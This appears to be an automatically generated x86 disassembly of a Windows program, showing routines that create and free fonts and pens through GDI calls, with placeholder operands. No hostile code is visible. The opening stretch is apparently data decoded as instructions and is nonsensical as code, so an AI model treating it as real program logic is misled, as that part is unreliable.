add [ ecx + esi * 8 + 0x41 ] bl
add [ eax + 0x2 ] dh
inc edx
sub_41bbdd
add al 0x42
add ah ch
or [ edx ] al
movsb [ edi ] [ esi ]
or eax 0xe280042
inc edx
add [ ecx ] cl
push esp
dec ebp
je r-xdata
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ eax ] bh
imul bp [ ebp - 0x75 ] 0xfcc0
mov ebx 0x9070041
push esp
dec ebp
je r-xdata
adc al [ edx ]
xchg esp eax
adc al [ edx ]
or al 0x54
inc eax
add [ eax + 0x38004030 ] bh
inc ecx
add [ ebx + esi + 0x40 ] cl
add ah cl
inc esp
inc ecx
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ ebx + 0x440c0042 ] ah
inc ecx
add [ ecx + esi * 8 + 0x41 ] bl
add [ eax + 0x1d ] ah
inc edx
add [ ebp + eax * 2 + 0x41 ] bl
add [ edi + ebx ] dh
inc edx
add [ edi + ebx - 0xe57ffbe ] dh
inc ecx
add [ eax + 0x22 ] ch
inc edx
add [ ebx ] bl
inc edx
add [ ebx + 0x42 ] bl
add ah dh
inc ecx
add [ eax + 0x4004223 ] bh
sub [ edx ] al
add [ eax ] dh
inc edx
add ah dl
xor [ edx ] al
fdivr st3
inc ecx
add al bh
xor [ edx ] eax
dec esp
xor al [ edx ]
mov esp 0xf800421c
inc ecx
add [ eax - 0x7fffbe0d ] al
inc edx
add [ esi + 0x25fc0042 ] cl
inc edx
add [ esi + 0x22cc0042 ] dl
inc edx
add [ ebx ] ch
inc edx
add al cl
inc edx
add [ edi ] al
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41bd4470
add [ edi ] al
pop es
push esp
inc edx
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
cmp [ edx ] dl
inc edx
add [ edx + edx + 0x540c0042 ] dl
imul bp [ ebp - 0x78 ] 0x41bb
add [ eax - 0x47 ] al
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
popad
nop
or al 0xbe
inc ecx
add [ eax ] al
jo r-xdata
lea eax [ bx + si ]
enter 0x41bc 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
mov ebp 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ ebp + 0x3c0041 ] bh
popad
jo r-xdata
inc eax
inc ecx
add [ ebx + esi + 0x40 ] cl
add ah cl
inc esp
inc ecx
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ eax + 0x36 ] dl
inc edx
add [ esp + eax * 2 ] cl
inc ecx
add [ ecx + esi * 8 + 0x41 ] bl
add [ eax + 0x5c004236 ] al
inc ebp
inc ecx
add ah ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi * 4 + 0x41 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x42 ] dh
inc ecx
add [ eax + eax ] dh
add [ eax ] al
jl r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
mov al 0xbd
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edi * 4 + 0x180041 ] dh
add [ eax ] al
jl r-xdata
add [ eax ] al
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edi * 4 + 0x41 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
mov ebp 0x3c0041
imul esp [ ebx + 0x73 ] 0xbc680000
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 4 + 0x41 ] ch
add [ eax + eax ] dh
add [ edx + edi * 4 + 0x41 ] bh
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41bcc870
add [ eax - 0x47 ] al
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ ebp + esi + 0x35e40042 ] dh
inc edx
add [ edx ] cl
push esp
dec ecx
arpl [ edi + 0x6e ] bp
dec ecx
insd
inc ecx
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
sub_41be1e
inc ecx
add al ah
inc edx
add [ eax + 0x200041f1 ] ch
aaa
inc edx
add [ edi + esi + 0x42 ] cl
add al dh
inc ecx
add ah dh
inc ecx
add [ eax + 0x37 ] ah
inc edx
add [ ebx + esi * 8 + 0x41 ] dh
add ah ah
cmp [ edx ] eax
fdiv st3
inc ecx
add ah bh
cmp [ edx ] eax
add [ edx ] bh
inc edx
add ah ch
inc ecx
add ah bh
xor eax 0xf2f80042
inc ecx
add [ eax - 0x5fffbe0d ] al
cmp [ edx ] al
sbb [ edx ] bh
inc edx
add [ eax + 0x3a ] al
inc edx
add [ edx + edi + 0x42 ] dl
add [ 0x6f634954 ] al
outsb
mov eax eax
jl r-xdata
pushad
aaa
inc ecx
add [ edi ] al
add eax 0x6f634954
outsb
or al 0xbe
inc ecx
add [ eax - 0x47 ] al
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
inc eax
add [ edi + edi * 4 + 0x41 ] bl
add [ eax ] dl
push esp
push edx
jo r-xdata
lahf
jne r-xdata
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
retn
cmp eax [ rw-data ]
pop esi
pop ebx
retn
mov eax esi
call sub_403478
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_41beac
clc
mov esi 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
mov esi 0x240041
add [ eax ] al
mov al [ 0x4c004010 ]
xor eax [ eax ]
pop eax
xor eax [ eax ]
pop esp
xor eax [ eax ]
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0x5c004030
mov edi 0x54100041
push edx
jae r-xdata
lahf
jne r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
je r-xdata
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
retn
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_41bf20
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_41bf5c
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_41bf98
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_41bf0c
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_41bf80
xor edx edx
push ebp
push j_sub_403858#3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c073
mov eax [ ebp - 0x4 ]
call sub_41bf8c
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_4026bc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4028b8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_407ad0
test al al
je r-xdata
sub_41c07c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_41bf80
xor ecx ecx
push ebp
push sub_41c103
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bf8c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_41c12c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41bf80
xor eax eax
push ebp
push sub_41c195
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41bf98
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41c07c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c19c
mov eax [ ebp - 0x4 ]
call sub_41bf8c
retn
mov eax ebx
mov si 0xfffd
call sub_403300
sub_41c1a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41bf80
xor eax eax
push ebp
push sub_41c200
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c207
mov eax [ ebp - 0x4 ]
call sub_41bf8c
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_403300
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41c07c
sub_41c210
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41bf80
xor edx edx
push ebp
push sub_41c26f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c276
mov eax [ ebp - 0x4 ]
call sub_41bf8c
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_41c27c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_4140d8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41c319
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_413d6c
mov ebx eax
mov eax ebx
call sub_41d848
inc [ ebp - 0x4 ]
mov eax ebx
call sub_41db5c
mov eax [ rw-data ]
call sub_41c210
mov eax [ rw-data ]
call sub_41c210
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c320
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_41413c
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_413d6c
call sub_41da34
inc esi
dec ebx
jne r-xdata
sub_41c96f
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_41381c
retn
sub_41c9a0
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402c18
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402a08
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_41ca54
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41bf98
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_41caa8
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41c07c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_41caec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414328
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41c7ac
xor eax eax
push ebp
push sub_41cba7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41c7ac
xor eax eax
push ebp
push sub_41cb8a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c1a4
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41cc28
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cb91
mov eax [ ebp - 0x8 ]
call sub_41c7bc
retn
mov eax ebx
call sub_41ceac
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41cec8
sub_41cbd8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c7ac
xor eax eax
push ebp
push sub_41cc1d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c12c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cc24
mov eax [ ebp - 0x4 ]
call sub_41c7bc
retn
sub_41cc3c
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41cdc5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cdcc
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_403e78
retn
mov eax [ rw-data ]
call sub_41bf80
xor eax eax
push ebp
push sub_41cd9d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41bf8c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_4040b8
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_40859c
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_4040b8
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_40859c
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_4040b8
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_407c08
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_41cf20
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_41cde4
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_41c9a0
mov edx esp
mov eax ebx
call sub_41cbd8
add esp 0x2c
pop esi
pop ebx
retn
sub_41ce10
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41cbc0
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_41cbd8
add esp 0x2c
pop esi
pop ebx
retn
sub_41ce50
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_41cbc0
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402b18
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_4040f0
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402a08
mov edx esp
mov eax ebx
call sub_41cbd8
sub_41cec8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_41ce10
pop esi
pop ebx
retn
sub_41cef4
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_41cbc0
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_41cbd8
add esp 0x30
pop ebx
retn
sub_41cf28
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41cbc0
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_41cbd8
add esp 0x2c
pop esi
pop ebx
retn
sub_41cf58
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41cbc0
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_41cbd8
add esp 0x2c
pop esi
pop ebx
retn
sub_41cf80
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41bf98
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_41cfc4
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41c07c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_41cfec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414328
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41c7ac
xor eax eax
push ebp
push sub_41d08b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41c7ac
xor eax eax
push ebp
push sub_41d06e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c1a4
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41d1d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d075
mov eax [ ebp - 0x8 ]
call sub_41c7bc
retn
sub_41d0a4
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_41d0bc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c7ac
xor eax eax
push ebp
push sub_41d101
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c12c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d108
mov eax [ ebp - 0x4 ]
call sub_41c7bc
retn
sub_41d114
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41d0a4
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_41d0bc
add esp 0x10
pop esi
pop ebx
retn
sub_41d13c
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41bf80
xor eax eax
push ebp
push sub_41d1c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41bf8c
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41c768
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_41d1f0
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41d0a4
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_41d0bc
add esp 0x10
pop esi
pop ebx
retn
sub_41d220
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_41d0a4
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_41d0bc
sub_41d24c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41bf98
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_41d28c
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41c07c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_41d2b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
